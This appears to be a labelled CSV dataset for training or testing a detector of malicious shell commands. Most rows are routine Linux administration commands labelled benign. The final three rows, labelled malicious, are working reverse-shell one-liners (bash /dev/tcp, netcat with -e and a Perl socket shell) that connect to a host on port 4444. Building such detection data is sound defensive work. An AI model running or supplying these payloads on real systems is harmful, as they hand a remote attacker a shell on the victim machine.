"command","label"
"cd /var/log",0
"pwd",0
"ls -la",0
"cp file.txt /backup",0
"mv oldname.txt newname.txt",0
"rm -rf directory",0
"touch newfile.txt",0
"mkdir -p /path/to/newdir",0
"cat logfile.txt",0
"less largefile.txt",0
"head -n 5 access.log",0
"tail -n 10 error.log",0
"uname -a",0
"top",0
"df -h",0
"free -m",0
"chmod 755 script.sh",0
"chown user:group file.txt",0
"apt update",0
"apt install nginx",0
"yum update",0
"dnf install python3",0
"ping -c 4 google.com",0
"ifconfig",0
"netstat -tulpn",0
"whoami",0
"id",0
"adduser newuser",0
"ps aux",0
"kill -9 1234",0
"htop",0
"vim file.txt",0
"nano config.conf",0
"cd ~",0
"ls -R",0
"cp -r dir1 dir2",0
"mv dir1 /archive",0
"rm file.txt",0
"cat file1.txt file2.txt",0
"less -N logfile.txt",0
"head access.log",0
"tail -f error.log",0
"uname -r",0
"df /",0
"free -h",0
"chmod +x script.sh",0
"chown -R user:group /data",0
"apt upgrade",0
"yum install httpd",0
"dnf update",0
"ping 8.8.8.8",0
"ifconfig eth0",0
"netstat -an",0
"whoami",0
"id newuser",0
"adduser --home /home/testuser testuser",0
"ps -ef",0
"kill 1234",0
"htop -u user",0
"vim +10 file.txt",0
"nano -l config.conf",0
"cd ..",0
"ls -lh",0
"cp file.txt file.bak",0
"mv file.txt /tmp",0
"rm -i file.txt",0
"cat -n script.sh",0
"less +G logfile.txt",0
"head -n 20 access.log",0
"tail -n +2 error.log",0
"cd -",0
"ls -t",0
"pwd -P",0
"cp -p file.txt /backup",0
"mv -i file.txt /tmp",0
"rm -r dir1",0
"touch -t 202505211200 file.txt",0
"mkdir newdir",0
"cat > newfile.txt",0
"less +F logfile.txt",0
"head -c 100 file.txt",0
"tail -n 5 access.log",0
"uname -m",0
"top -n 1",0
"df -T",0
"free -t",0
"chmod 644 file.txt",0
"chown -h user symlink",0
"apt autoremove",0
"apt purge nginx",0
"yum remove httpd",0
"dnf upgrade",0
"ping -i 0.5 google.com",0
"ifconfig eth0 up",0
"netstat -i",0
"who",0
"passwd newuser",0
"userdel -r testuser",0
"ps -C nginx",0
"killall nginx",0
"htop -d 5",0
"vim -R file.txt",0
"nano -c config.conf",0
"cd /etc",0
"ls -1",0
"cp -u file.txt /backup",0
"mv -n file.txt /tmp",0
"rm -v file.txt",0
"cat << EOF > script.sh",0
"less -i logfile.txt",0
"head -n -5 access.log",0
"tail -q -n 3 file1.txt file2.txt",0
"uname -n",0
"df -i",0
"chmod -R 750 /data",0
"chown :group file.txt",0
"apt clean",0
"yum check-update",0
"dnf autoremove",0
"ping -c 2 192.168.1.1",0
"ifconfig eth0 down",0
"netstat -r",0
"w",0
"usermod -aG sudo newuser",0
"groupadd newgroup",0
"ps -u user",0
"pkill -u user",0
"htop -t",0
"vim -c 'set number' file.txt",0
"nano -w config.conf",0
"cd /usr/local/bin",0
"ls -S",0
"cp -v file.txt /backup",0
"mv -u dir1 /archive",0
"touch -a file.txt",0
"cat -s file.txt",0
"less -M logfile.txt",0
"head -q -n 2 file1.txt file2.txt",0
"tail -v -n 2 error.log",0
"free -s 2",0
"chmod u+x script.sh",0
"chown -R user:group /var/www",0
"apt list --installed",0
"yum history",0
"dnf provides /bin/bash",0
"ping -s 100 google.com",0
"netstat -s",0
"last",0
"ps -p 1234",0
"vim -b file.bin",0
"bash -i >& /dev/tcp/10.10.14.1/4444 0>&1",1
"nc -e /bin/sh 10.10.14.1 4444",1
"perl -e 'use Socket;$i=""10.10.14.1"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",1
